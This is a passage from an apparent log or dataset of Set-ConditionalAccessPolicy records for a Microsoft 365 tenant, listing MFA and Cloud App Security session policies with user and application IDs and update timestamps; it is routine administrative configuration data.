'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-06-11T12:45:19.4695224Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '6/23/2020 2:22:03 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/23/2020 5:22:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/23/2020 5:22:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/24/2020 1:55:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/24/2020 1:55:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/24/2020 1:55:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/24/2020 1:55:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/24/2020 5:12:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/24/2020 5:12:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/25/2020 2:07:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '6/25/2020 2:07:28 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/26/2020 3:33:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/26/2020 3:33:05 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/26/2020 6:48:26 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/26/2020 6:48:26 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/27/2020 2:30:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/27/2020 2:30:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/27/2020 2:30:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/27/2020 2:30:20 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/27/2020 5:00:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/27/2020 5:00:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/28/2020 2:15:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/28/2020 2:15:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/28/2020 5:20:09 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/28/2020 5:20:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-06-11T12:45:19.4695224Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '6/28/2020 5:20:11 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-06-11T12:45:19.4695224Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '6/28/2020 5:20:11 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/29/2020 1:51:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': 